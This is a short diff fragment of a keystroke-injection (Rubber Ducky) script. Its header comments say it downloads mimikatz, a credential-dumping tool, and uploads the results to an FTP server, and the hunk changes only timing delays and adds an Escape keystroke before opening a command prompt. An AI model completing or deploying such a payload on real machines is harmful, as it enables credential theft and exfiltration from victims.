@@ -3,7 +3,8 @@ REM Modified for FTP by ThePlasmaRailgun
 REM Date: 10/20/2013
 REM Downloads mimikatz for 64 bit or 32 bit systems and uploads result to FTP server
 REM -------------open command prompt with admin privileges
-DELAY 3000
+DELAY 2000
+ESCAPE
 CONTROL ESCAPE
 DELAY 1000
 STRING cmd
